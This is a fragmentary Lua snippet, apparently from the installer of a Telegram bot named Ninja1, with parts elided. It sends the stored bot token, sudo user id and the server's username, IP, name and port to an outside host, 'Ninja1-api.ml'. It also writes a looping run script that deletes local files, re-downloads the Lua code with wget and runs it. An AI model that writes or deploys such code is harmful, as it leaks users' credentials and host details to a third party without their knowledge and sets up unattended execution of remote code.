...
data,res = https.request("https://Ninja1-api.ml/index.php?bn=info&id="..Id)
if res == 200 then
...
local t = json:decode(https.request('https://Ninja1-api.ml/index.php?n=by&id='..redis:get(Server_Done.."UserSudo_Write").."&token="..redis:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
...
rm -fr Ninja1.lua
wget "https://raw.githubusercontent.com/sourceninjaiq/Ninja1/Ninja1/Ninja1.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./Ninja1.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
